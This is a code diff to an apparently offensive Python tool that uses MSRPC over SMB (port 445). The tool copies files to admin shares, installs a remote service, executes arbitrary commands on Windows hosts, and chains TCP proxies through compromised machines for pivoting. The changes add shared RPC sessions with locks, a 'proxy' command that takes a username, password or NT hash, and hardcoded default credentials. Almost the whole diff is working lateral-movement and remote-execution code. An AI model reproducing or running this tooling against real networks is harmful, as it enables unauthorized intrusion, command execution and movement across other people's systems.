@@ -17,6 +17,8 @@ from struct import unpack
 from sys import argv, exit
 import socket
 from time import sleep
+import threading
+import argparse
 
 
 def copy(target, creds, source_path, target_path, share="c$", lmhash="", nthash=""):
@@ -172,6 +174,7 @@ class ExecuteResponse(NDRCALL):
 
 def msrpc(target, creds):
 	ip, port = target
+	#print(f"[debug] {ip}")
 	username, password, domain = creds
 	MSRPC_UUID_test  = uuidtup_to_bin(('00001111-2222-3333-4444-555566667777','1.0'))
 
@@ -184,6 +187,7 @@ def msrpc(target, creds):
 	dce = rpctransport.get_dce_rpc()
 	dce.connect()
 	dce.bind(MSRPC_UUID_test)
+#	sleep(0.5)
 	return dce
 
 def execute(cmd, target, creds):
@@ -194,75 +198,119 @@ def execute(cmd, target, creds):
 	execute = Execute()
 	execute["cmd"] = cmd + "\x00"
 	res = dce.request(execute)
-	return str(res["data"], "cp866")
+	try:
+		result = str(res["data"], "cp866")
+	except:
+		result = res["data"]
+	dce.disconnect()
+	return result
 
 connections = {}
+dce_sessions = {}
 def proxy(target_from, target_to, creds):
 	ip_from, port_from = target_from
 	ip_to, port_to = target_to
 	username, password, domain = creds
 	#print(target_from, target_to ,username, password, domain)
 
-	def incoming(c, sock, target_from, creds, connect_id):
+	def incoming(dce_session, c, sock, target_from, creds, connect_id):
 		global connections
-		dce = msrpc(target_from, creds)
+		#dce = msrpc(target_from, creds)
+		dce = dce_session["dce"]
 		while True:
+			if not connections[connect_id]:
+				break
 			recv = Recv()
 			recv["socket"] = sock
 			recv["len"] = 1024
+			dce_session["mutex"].acquire()
 			dce.call(recv.opnum, recv)
 			res = dce.recv()
-			data = res[ 4 : unpack("<I", res[-4:])[0]+4 ]
+			dce_session["mutex"].release()
+			length = unpack("<i", res[-4:])[0]
+			data = res[ 4 : length+4 ]
+			if length == -1:
+				continue # waiting data
 			if not data:
-				print("incoming closed")
-				connections[connect_id] = True
+				print("[*] RPC incoming closed")
+				connections[connect_id] = False
 				break
-#			print("<-" + str(data) + "[" + str(len(data)) + "]")
-			c.send(data)
+#			print("<-" + "[" + str(len(data)) + "]")
+			try:
+				c.send(data)
+			except:
+				print("[*] local incoming closed")
+				connections[connect_id] = False
+				break
 			#print("incoming")
+		#dce.disconnect()
 
-	def outcoming(c, sock, target_from, creds, connect_id):
+	def outcoming(dce_session, c, sock, target_from, creds, connect_id):
 		global connections
-		dce = msrpc(target_from, creds)
+		#dce = msrpc(target_from, creds)
+		dce = dce_session["dce"]
 		while True:
-			data = c.recv(1024)
-			if not data or connections[connect_id]:
-				print("outcoming closed")
-				connections[connect_id] = True
+			try:
+				data = c.recv(1024)
+			except:
+				print("[*] local outcoming closed")
+				connections[connect_id] = False
 				break
-#			print("->" + str(data) + "[" + str(len(data)) + "]")
+			if not data or not connections[connect_id]:
+				print("[*] outcoming closed")
+				connections[connect_id] = False
+				break
+#			print("->" + "[" + str(len(data)) + "]")
 			send = Send()
 			send["socket"] = sock
 			send["data"] = data + b"\x00"
 			send["len"] = len(data)
+			#connections[connect_id].acquire()
+			dce_session["mutex"].acquire()
 			res = dce.request(send, checkError=False)
+			dce_session["mutex"].release()
+			#connections[connect_id].release()
 			#res.dump()
 			#print("outcoming")
+		#dce.disconnect()
 
 	def redirect(c, target_from, target_to, creds, connect_id):
+		global dce_sessions
+		ip_from, port_from = target_from
 		ip_to, port_to = target_to
-
-		dce = msrpc(target_from, creds)
+		if not dce_sessions.get(ip_from):
+			dce_sessions[ip_from] = {
+				"main": {"dce": msrpc(target_from, creds), "mutex": threading.Lock()},
+				"incoming": {"dce": msrpc(target_from, creds), "mutex": threading.Lock()},
+				"outcoming": {"dce": msrpc(target_from, creds), "mutex": threading.Lock()},
+			}
+		dce = dce_sessions[ip_from]["main"]["dce"]
+		#dce = msrpc(target_from, creds)
 		connect = Connect()
 		connect["ip"] = ip_to + "\x00"
 		connect["port"] = port_to
+		dce_sessions[ip_from]["main"]["mutex"].acquire()
 		res = dce.request(connect, checkError=False)
+		dce_sessions[ip_from]["main"]["mutex"].release()
 		#res.dump()
 		if res["socket"]:
-			connections[connect_id] = False
-			incoming_thr = Thread(target=incoming, args=(c, res["socket"], target_from, creds, connect_id))
-			outcoming_thr = Thread(target=outcoming, args=(c, res["socket"], target_from, creds, connect_id))
+			connections[connect_id] = True
+			incoming_thr = Thread(target=incoming, args=(dce_sessions[ip_from]["incoming"], c, res["socket"], target_from, creds, connect_id))
+			outcoming_thr = Thread(target=outcoming, args=(dce_sessions[ip_from]["outcoming"], c, res["socket"], target_from, creds, connect_id))
 			incoming_thr.start()
 			outcoming_thr.start()
-			while not connections[connect_id]:
+			while connections[connect_id]:
 			    sleep(1)
 			#incoming_thr.join()
 			#outcoming_thr.join()
 
 			disconnect = Disconnect()
 			disconnect["socket"] = res["socket"]
+			dce_sessions[ip_from]["main"]["mutex"].acquire()
 			res = dce.request(disconnect)
-			res.dump()
+			dce_sessions[ip_from]["main"]["mutex"].release()
+			#res.dump()
+		#dce.disconnect()
 
 	def serve(s, target_from, target_to, creds):
 		local_port = s.getsockname()[1]
@@ -296,7 +344,7 @@ def check_pipe(target, creds):
 		dce.connect()
 		dce.bind(MSRPC_UUID_test)
 		return True
-	except Exception as e:
+	except:
 		return False
 
 class Chain:
@@ -320,26 +368,36 @@ def chain_get_root(the_chain):
 	return the_chain
 
 def chain_walk(the_chain, deep=0):
-	print(" "*deep + "`" + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
+	print(" "*deep + ("`" if deep > 0 else "") + (the_chain.target if the_chain.target != chain.target else the_chain.target+" <-"))
 	for the_chain in the_chain.next:
 		chain_walk(the_chain, deep+1)
 
+def parse_cmd_shell(cmd):
+	arg_parser = argparse.ArgumentParser()
+	arg_parser.add_argument('-user', dest="user", help='username', default='admin')
+	arg_parser.add_argument('-dom', dest="domain", default=".", help='domain')
+	arg_parser.add_argument('-pass', dest="passwd", help='password', default='qwerty=123')
+	arg_parser.add_argument('-hash', dest="hash", help='NT or NT:NTLM hash (opt)')
+	arg_parser.add_argument("ip", type=str, help="target IP")
+	args = arg_parser.parse_args(cmd)
+	return args
+
 if __name__ == '__main__':
-	target = argv[1]
-	username = 'admin'
-	password = 'qwerty=123'
-	domain = '.'
-	port = 445
-	chain = Chain(target, 445)
+	chain = False
 	while True:
-		line = input(f"{chain.target}/> ")
+		line = input(f"{chain.target if chain else 'shells'}/> ")
 		if not line:
 			continue
-		if line.startswith("shell "):
-			_,new_target = line.split(" ")
-			port = proxy((chain.target_ip, chain.target_port), (new_target, 445), (username, password, domain))
-			chain = chain.new(new_target, port)
-		elif line in ("show", "bt"):
+		if line.startswith("proxy "):
+			target = parse_cmd_shell(line.split(" ")[1:])
+			if chain:
+				port = proxy((chain.target_ip, chain.target_port), (target.ip, 445), (target.user, target.passwd, target.domain))
+				chain = chain.new(target.ip, port)
+			else:
+				chain = Chain(target.ip, 445)
+		elif line.startswith("shell "):
+			pass
+		elif line in ("show", "bt", "stack"):
 			chain_walk(chain_get_root(chain))
 		elif line in ("back",):
 			chain = chain.prev
@@ -347,8 +405,10 @@ if __name__ == '__main__':
 			pass
 		elif line in ('exit', 'quit', 'q'):
 			break
+		elif line in ('help',):
+			pass
 		else:
 			cmd = line
-			if not check_pipe((chain.target_ip, chain.target_port), (username, password, domain)):
-				install_service((chain.target_ip, chain.target_port), (username, password, domain))
-			print( execute(cmd, (chain.target_ip, chain.target_port), (username, password, domain)) )
+			if not check_pipe((chain.target_ip, chain.target_port), (target.user, target.passwd, target.domain)):
+				install_service((chain.target_ip, chain.target_port), (target.user, target.passwd, target.domain))
+			print( execute(cmd, (chain.target_ip, chain.target_port), (target.user, target.passwd, target.domain)) )
